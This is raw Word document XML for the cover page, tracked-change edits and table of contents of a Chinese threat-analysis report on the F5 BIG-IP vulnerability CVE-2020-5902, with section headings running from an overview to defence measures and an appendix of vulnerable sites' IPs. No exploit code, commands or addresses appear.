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55BE" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00D972A6" w:rsidP="00422B7D">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:commentRangeStart w:id="0"/>
      <w:commentRangeEnd w:id="0"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="af2"/>
        </w:rPr>
        <w:commentReference w:id="0"/>
      </w:r>
      <w:r w:rsidR="00422B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9728" wp14:editId="503AA4A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715000" cy="225552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BEE40" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D"/>
                          <w:p w14:paraId="5AEFD04F" w14:textId="43D1B45B" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00B9228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35855"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单位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_</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="36"/>
                              </w:rPr>
                              <w:t>________________</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3D175658" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRPr="00935855" w:rsidRDefault="00422B7D" w:rsidP="00422B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月</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="36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3972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0;margin-top:0;width:450pt;height:177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" fillcolor="white [3201]" stroked="f" strokeweight=".5pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="0BFBEE40" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D"/>
                    <w:p w14:paraId="5AEFD04F" w14:textId="43D1B45B" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00B92280">
                      <w:pPr>
                        <w:jc w:val="center"/>
                        <w:rPr>
                          <w:sz w:val="36"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00935855">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                          <w:b/>
                          <w:bCs/>
                          <w:sz w:val="36"/>
                        </w:rPr>
                        <w:t>单位</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                          <w:sz w:val="36"/>
                        </w:rPr>
                        <w:t>：</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                          <w:sz w:val="36"/>
                        </w:rPr>
                        <w:t>_</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="36"/>
                        </w:rPr>
                        <w:t>________________</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3D175658" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRPr="00935855" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                          <w:sz w:val="36"/>
                        </w:rPr>
                        <w:t>2020</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                          <w:sz w:val="36"/>
                        </w:rPr>
                        <w:t>年</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                          <w:sz w:val="36"/>
                        </w:rPr>
                        <w:t>7</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                          <w:sz w:val="36"/>
                        </w:rPr>
                        <w:t>月</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="36"/>
                        </w:rPr>
                        <w:t>10</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                          <w:sz w:val="36"/>
                        </w:rPr>
                        <w:t>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2B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CAE87" wp14:editId="6B5072E4">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>left</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="margin">
                  <wp:posOffset>2293620</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5715000" cy="305308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05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C7969" w14:textId="3E89DA06" w:rsidR="00422B7D" w:rsidRPr="003918E8" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
                            <w:pPr>
                              <w:pStyle w:val="aa"/>
                              <w:rPr>
                                <w:sz w:val="56"/>
                                <w:szCs w:val="40"/>
                              </w:rPr>
                            </w:pPr>
                            <w:bookmarkStart w:id="1" w:name="_Toc45275577"/>
                            <w:r w:rsidRPr="003918E8">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                                <w:sz w:val="56"/>
                                <w:szCs w:val="40"/>
                              </w:rPr>
                              <w:t>CVE-2020-5902</w:t>
                            </w:r>
                            <w:r w:rsidRPr="003918E8">
                              <w:rPr>
                                <w:rFonts w:hint="eastAsia"/>
                                <w:sz w:val="56"/>
                                <w:szCs w:val="40"/>
                              </w:rPr>
                              <w:t>漏洞</w:t>
                            </w:r>
                            <w:del w:id="2" w:author="芮志清" w:date="2020-07-10T12:10:00Z">
                              <w:r w:rsidRPr="003918E8" w:rsidDel="002F059C">
                                <w:rPr>
                                  <w:rFonts w:hint="eastAsia"/>
                                  <w:sz w:val="56"/>
                                  <w:szCs w:val="40"/>
                                </w:rPr>
                                <w:delText>复现</w:delText>
                              </w:r>
                              <w:r w:rsidRPr="003918E8" w:rsidDel="002F059C">
                                <w:rPr>
                                  <w:sz w:val="56"/>
                                  <w:szCs w:val="40"/>
                                </w:rPr>
                                <w:delText>技术</w:delText>
                              </w:r>
                            </w:del>
                            <w:ins w:id="3" w:author="芮志清" w:date="2020-07-10T12:10:00Z">
                              <w:r w:rsidR="002F059C">
                                <w:rPr>
                                  <w:rFonts w:hint="eastAsia"/>
                                  <w:sz w:val="56"/>
                                  <w:szCs w:val="40"/>
                                </w:rPr>
                                <w:t>威胁分析</w:t>
                              </w:r>
                            </w:ins>
                            <w:r w:rsidRPr="003918E8">
                              <w:rPr>
                                <w:sz w:val="56"/>
                                <w:szCs w:val="40"/>
                              </w:rPr>
                              <w:t>报告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AE87" id="文本框 2" o:spid="_x0000_s1027" type="#_x0000_t202" style="position:absolute;margin-left:0;margin-top:180.6pt;width:450pt;height:24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" fillcolor="white [3201]" stroked="f" strokeweight=".5pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="2ABC7969" w14:textId="3E89DA06" w:rsidR="00422B7D" w:rsidRPr="003918E8" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
                      <w:pPr>
                        <w:pStyle w:val="aa"/>
                        <w:rPr>
                          <w:sz w:val="56"/>
                          <w:szCs w:val="40"/>
                        </w:rPr>
                      </w:pPr>
                      <w:bookmarkStart w:id="4" w:name="_Toc45275577"/>
                      <w:r w:rsidRPr="003918E8">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                          <w:sz w:val="56"/>
                          <w:szCs w:val="40"/>
                        </w:rPr>
                        <w:t>CVE-2020-5902</w:t>
                      </w:r>
                      <w:r w:rsidRPr="003918E8">
                        <w:rPr>
                          <w:rFonts w:hint="eastAsia"/>
                          <w:sz w:val="56"/>
                          <w:szCs w:val="40"/>
                        </w:rPr>
                        <w:t>漏洞</w:t>
                      </w:r>
                      <w:del w:id="5" w:author="芮志清" w:date="2020-07-10T12:10:00Z">
                        <w:r w:rsidRPr="003918E8" w:rsidDel="002F059C">
                          <w:rPr>
                            <w:rFonts w:hint="eastAsia"/>
                            <w:sz w:val="56"/>
                            <w:szCs w:val="40"/>
                          </w:rPr>
                          <w:delText>复现</w:delText>
                        </w:r>
                        <w:r w:rsidRPr="003918E8" w:rsidDel="002F059C">
                          <w:rPr>
                            <w:sz w:val="56"/>
                            <w:szCs w:val="40"/>
                          </w:rPr>
                          <w:delText>技术</w:delText>
                        </w:r>
                      </w:del>
                      <w:ins w:id="6" w:author="芮志清" w:date="2020-07-10T12:10:00Z">
                        <w:r w:rsidR="002F059C">
                          <w:rPr>
                            <w:rFonts w:hint="eastAsia"/>
                            <w:sz w:val="56"/>
                            <w:szCs w:val="40"/>
                          </w:rPr>
                          <w:t>威胁分析</w:t>
                        </w:r>
                      </w:ins>
                      <w:r w:rsidRPr="003918E8">
                        <w:rPr>
                          <w:sz w:val="56"/>
                          <w:szCs w:val="40"/>
                        </w:rPr>
                        <w:t>报告</w:t>
                      </w:r>
                      <w:bookmarkEnd w:id="4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2B7D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1"/>
          <w:lang w:val="zh-CN"/>
        </w:rPr>
        <w:id w:val="1128208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21A8A" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
          <w:pPr>
            <w:pStyle w:val="TOC"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:lang w:val="zh-CN"/>
            </w:rPr>
            <w:t>目录</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="0C03EE90" w14:textId="02C9323F" w:rsidR="00CF72CA" w:rsidRDefault="00422B7D">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:rPr>
              <w:ins w:id="4" w:author="芮志清" w:date="2020-07-10T12:12:00Z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5" w:author="芮志清" w:date="2020-07-10T12:12:00Z">
            <w:r w:rsidR="00CF72CA" w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00CF72CA" w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:instrText xml:space="preserve"> </w:instrText>
            </w:r>
            <w:r w:rsidR="00CF72CA">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:instrText>HYPERLINK "E:\\WeChat Files\\WeChat Files\\wxid_0z4agx41rqny21\\FileStorage\\File\\2020-07\\CVE-2020-5902</w:instrText>
            </w:r>
            <w:r w:rsidR="00CF72CA">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:instrText>漏洞复现</w:instrText>
            </w:r>
            <w:r w:rsidR="00CF72CA">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:instrText>.docx" \l "_Toc45275577"</w:instrText>
            </w:r>
            <w:r w:rsidR="00CF72CA" w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:instrText xml:space="preserve"> </w:instrText>
            </w:r>
            <w:r w:rsidR="00CF72CA" w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00CF72CA" w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:t>CVE-2020-5902</w:t>
            </w:r>
            <w:r w:rsidR="00CF72CA" w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:t>漏洞威胁分析报告</w:t>
            </w:r>
            <w:r w:rsidR="00CF72CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00CF72CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00CF72CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc45275577 \h </w:instrText>
            </w:r>
          </w:ins>
          <w:r w:rsidR="00CF72CA">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
          </w:r>
          <w:r w:rsidR="00CF72CA">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:ins w:id="6" w:author="芮志清" w:date="2020-07-10T12:12:00Z">
            <w:r w:rsidR="00CF72CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00CF72CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
            <w:r w:rsidR="00CF72CA" w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:ins>
        </w:p>
        <w:p w14:paraId="0DE3C8E2" w14:textId="0EB18B52" w:rsidR="00CF72CA" w:rsidRDefault="00CF72CA">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="420"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:rPr>
              <w:ins w:id="7" w:author="芮志清" w:date="2020-07-10T12:12:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:ins w:id="8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"_Toc45275578"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1.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问题概述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_Toc45275578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芮志清" w:date="2020-07-10T12:1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769E2CE9" w14:textId="29F0BA06" w:rsidR="00CF72CA" w:rsidRDefault="00CF72CA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ins w:id="10" w:author="芮志清" w:date="2020-07-10T12:12:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:ins w:id="11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"_Toc45275580"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1.1.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什么是</w:t>
            </w:r>
            <w:r w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:t>BIG-IP?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_Toc45275580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芮志清" w:date="2020-07-10T12:1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2D2DEA4C" w14:textId="34B1CDA4" w:rsidR="00CF72CA" w:rsidRDefault="00CF72CA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ins w:id="13" w:author="芮志清" w:date="2020-07-10T12:12:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:ins w:id="14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"_Toc45275581"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1.2.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威胁程度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_Toc45275581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芮志清" w:date="2020-07-10T12:12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55821EA1" w14:textId="2B956C98" w:rsidR="00CF72CA" w:rsidRDefault="00CF72CA">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="420"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:rPr>
              <w:ins w:id="16" w:author="芮志清" w:date="2020-07-10T12:12:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:ins w:id="17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"_Toc45275582"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2.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现状概述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_Toc45275582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芮志清" w:date="2020-07-10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7BDDE917" w14:textId="2F7B421F" w:rsidR="00CF72CA" w:rsidRDefault="00CF72CA">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="420"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:rPr>
              <w:ins w:id="19" w:author="芮志清" w:date="2020-07-10T12:12:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:ins w:id="20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"_Toc45275583"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3.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威胁分析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_Toc45275583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芮志清" w:date="2020-07-10T12:1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0B44190F" w14:textId="679E2BC9" w:rsidR="00CF72CA" w:rsidRDefault="00CF72CA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ins w:id="22" w:author="芮志清" w:date="2020-07-10T12:12:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:ins w:id="23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"_Toc45275584"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3.1.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攻击复现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_Toc45275584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芮志清" w:date="2020-07-10T12:1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4E82181C" w14:textId="28C18503" w:rsidR="00CF72CA" w:rsidRDefault="00CF72CA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ins w:id="25" w:author="芮志清" w:date="2020-07-10T12:12:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:ins w:id="26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"_Toc45275585"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3.2.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漏洞原理解析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_Toc45275585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芮志清" w:date="2020-07-10T12:1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6FE3C4D5" w14:textId="3475B02C" w:rsidR="00CF72CA" w:rsidRDefault="00CF72CA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ins w:id="28" w:author="芮志清" w:date="2020-07-10T12:12:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:ins w:id="29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"_Toc45275608"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3.3.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防御措施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芮志清" w:date="2020-07-10T12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10031758" w14:textId="6C9FC82B" w:rsidR="00CF72CA" w:rsidRDefault="00CF72CA">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="420"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:rPr>
              <w:ins w:id="31" w:author="芮志清" w:date="2020-07-10T12:12:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:ins w:id="32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"_Toc45275609"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4.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芮志清" w:date="2020-07-10T12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61A3371A" w14:textId="051E437E" w:rsidR="00CF72CA" w:rsidRDefault="00CF72CA">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="420"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:rPr>
              <w:ins w:id="34" w:author="芮志清" w:date="2020-07-10T12:12:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:ins w:id="35" w:author="芮志清" w:date="2020-07-10T12:12:00Z">
            <w:r w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidRPr="006E6F9B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"_Toc45275610"</w:instrText>
            </w:r>
            <w:r w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:instrText xml:space="preserve"> </w:instrText>
            </w:r>
            <w:r w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:t>5.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:sz w:val="21"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>附件：北京市拥有相似漏洞的网站</w:t>
            </w:r>
            <w:r w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>IP</w:t>
            </w:r>
            <w:r w:rsidRPr="006E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"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_Toc45275610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芮志清" w:date="2020-07-10T12:1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E6F9B">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:ins>
        </w:p>
        <w:p w14:paraId="36786E88" w14:textId="018D8668" w:rsidR="00B92280" w:rsidDel="002F059C" w:rsidRDefault="00B92280">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:rPr>
              <w:del w:id="37" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="38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"E:\\WeChat Files\\WeChat Files\\wxid_0z4agx41rqny21\\FileStorage\\File\\2020-07\\CVE-2020-5902</w:delInstrText>
            </w:r>
            <w:r w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:delInstrText>漏洞复现</w:delInstrText>
            </w:r>
            <w:r w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:delInstrText>.docx" \l "_Toc45272943"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39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40" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>CVE-2020-5902</w:delText>
            </w:r>
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>漏洞复现技术报告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_Toc45272943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  <w:r w:rsidR="00E24169" w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>1</w:delText>
            </w:r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453532E5" w14:textId="532E8872" w:rsidR="00B92280" w:rsidDel="002F059C" w:rsidRDefault="00B92280">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="420"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:rPr>
              <w:del w:id="41" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="42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"_Toc45272944"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43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44" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>1.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问题概述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_Toc45272944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  <w:r w:rsidR="00E24169" w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>3</w:delText>
            </w:r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24EE4CB7" w14:textId="08B036C5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45" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="46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"_Toc45272945"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47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48" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>1.1.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什么是</w:delText>
            </w:r>
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>BIG-IP?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_Toc45272945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  <w:r w:rsidR="00E24169" w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>3</w:delText>
            </w:r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6501D3EE" w14:textId="72CB8A63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49" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="50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"_Toc45272946"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51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52" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>1.2.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利用漏洞思路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_Toc45272946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  <w:r w:rsidR="00E24169" w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>3</w:delText>
            </w:r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122C4E4B" w14:textId="7351D39B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53" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="54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"_Toc45272947"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55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56" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>1.3.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可能造成的影响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_Toc45272947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  <w:r w:rsidR="00E24169" w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>3</w:delText>
            </w:r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48C45E40" w14:textId="3755E2A6" w:rsidR="00B92280" w:rsidDel="002F059C" w:rsidRDefault="00B92280">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="420"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:rPr>
              <w:del w:id="57" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="58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"_Toc45272948"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59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60" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>2.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现状概述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_Toc45272948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  <w:r w:rsidR="00E24169" w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>4</w:delText>
            </w:r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30609046" w14:textId="06C8A25B" w:rsidR="00B92280" w:rsidDel="002F059C" w:rsidRDefault="00B92280">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="420"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:rPr>
              <w:del w:id="61" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="62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"_Toc45272949"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63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64" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>3.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威胁分析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_Toc45272949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  <w:r w:rsidR="00E24169" w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>4</w:delText>
            </w:r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038B8ACD" w14:textId="2B47A416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65" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="66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"_Toc45272950"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67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68" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>3.1.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发现过程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_Toc45272950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</w:del>
          <w:del w:id="69" w:author="芮志清" w:date="2020-07-10T12:05:00Z">
            <w:r w:rsidDel="00E24169">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>5</w:delText>
            </w:r>
          </w:del>
          <w:del w:id="70" w:author="芮志清" w:date="2020-07-10T12:11:00Z"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1B5884E2" w14:textId="0BC8AC82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71" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="72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"_Toc45272951"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73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74" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>3.2.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攻击复现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_Toc45272951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</w:del>
          <w:del w:id="75" w:author="芮志清" w:date="2020-07-10T12:05:00Z">
            <w:r w:rsidDel="00E24169">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>6</w:delText>
            </w:r>
          </w:del>
          <w:del w:id="76" w:author="芮志清" w:date="2020-07-10T12:11:00Z"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2DEEA499" w14:textId="7B5C68D9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77" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="78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"_Toc45272952"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79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80" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>3.3.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防御措施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_Toc45272952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</w:del>
          <w:del w:id="81" w:author="芮志清" w:date="2020-07-10T12:05:00Z">
            <w:r w:rsidDel="00E24169">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
